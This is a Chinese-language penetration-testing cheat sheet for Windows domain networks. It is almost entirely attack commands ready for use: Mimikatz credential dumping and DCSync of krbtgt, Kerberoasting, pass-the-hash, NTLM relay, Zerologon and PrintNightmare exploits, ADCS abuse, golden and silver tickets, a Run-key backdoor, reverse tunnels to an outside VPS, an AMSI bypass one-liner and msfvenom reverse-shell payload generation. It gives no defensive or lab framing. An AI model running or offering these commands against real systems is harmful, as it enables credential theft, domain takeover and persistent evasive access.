# 内网渗透详细分类

## 1. 信息收集

### 端口扫描

```bash
# Nmap
nmap -sS -T4 -p- 192.168.1.0/24
nmap -sV -sC 192.168.1.1
nmap --script vuln 192.168.1.1

# Masscan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### 服务识别

```bash
nmap -sV 192.168.1.1
whatweb http://target.com
wappalyzeralyzer http://target.com
```

### 目录扫描

```bash
gobuster dir -u http://target.com -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt
dirsearch -u http://target.com
```

---

## 2. 域信息收集

### 基本命令

```bash
net config workstation
net user /domain
net group "Domain Admins" /domain
nltest /dclist:domain.com
```

### PowerView

```powershell
Get-NetDomain
Get-NetDomainController
Get-NetUser -AdminCount
Get-NetGroup -AdminCount
Get-NetComputer
Get-ADComputer
```

### BloodHound

```bash
# 采集
SharpHound.exe -c All
bloodhound-python -u user -p pass -d domain.com

# 查询
MATCH (n:User) RETURN n
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) RETURN p
```

---

## 3. SPN扫描

```bash
# Windows
setspn -T domain.com -Q */*
setspn -T domain.com -Q HTTP/*

# PowerShell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

# Impacket
GetUserSPNs.py domain/user:pass -dc-ip dc_ip -request
```

---

## 4. 凭证窃取

### Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::dcsync /domain:domain.com /user:krbtgt
```

### Kerberoasting

```bash
GetUserSPNs.py domain/user:pass -request
Rubeus.exe kerberoast
```

### AS-REP Roasting

```bash
GetNPUsers.py domain/ -request
Rubeus.exe asreproast
```

---

## 5. 横向移动

### Pass-the-Hash

```bash
# Impacket
psexec.py -hashes :NTHASH user@target
wmiexec.py -hashes :NTHASH user@target

# CrackMapExec
crackmapexec smb target -u user -H NTHASH
```

### Pass-the-Ticket

```bash
# 导出票据
sekurlsa::tickets /export

# 导入票据
kerberos::ptt ticket.kirbi
```

### NTLM Relay

```bash
# 监听
responder -I eth0

# Relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 6. 权限提升

### Windows

```cmd
systeminfo
whoami /all
net user administrator
```

### Linux

```bash
uname -a
id
sudo -l
find / -perm -4000 2>/dev/null
```

---

## 7. 域渗透攻击

### Zerologon

```bash
python3 cve-2020-1472.py -target dc_ip
secretsdump.py -hashes :NTHASH domain/target$@dc_ip
```

### PrintNightmare

```bash
python3 printnightmare.py domain/user:pass@target
```

### ADCS攻击

```bash
# ESC1
Certify.exe request /ca:ca-name /template:Template /alt:target@domain.com

# ESC8
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs
```

---

## 8. 权限维持

### 黄金票据

```bash
kerberos::golden /domain:domain.com /sid:SID /krbtgt:hash /user:admin
```

### 白银票据

```bash
kerberos::silver /domain:domain.com /sid:SID /target:server.domain.com /service:cifs /rc4:hash
```

### 注册表后门

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\shell.exe"
```

---

## 9. 隧道代理

### SSH隧道

```bash
ssh -D 1080 user@jump_host
ssh -L 8080:target:80 user@jump_host
ssh -R 8080:local:80 user@vps
```

### FRP

```bash
# 服务端
./frps -c frps.ini

# 客户端
./frpc -c frpc.ini
```

### Chisel

```bash
# 服务端
chisel server -p 8080 --reverse

# 客户端
chisel client vps:8080 R:1080:socks
```

---

## 10. 免杀技术

### AMSI绕过

```powershell
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

### 加载器

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=x -f csharp
```

### 分割Payload

```
shellcode混淆
加密
```
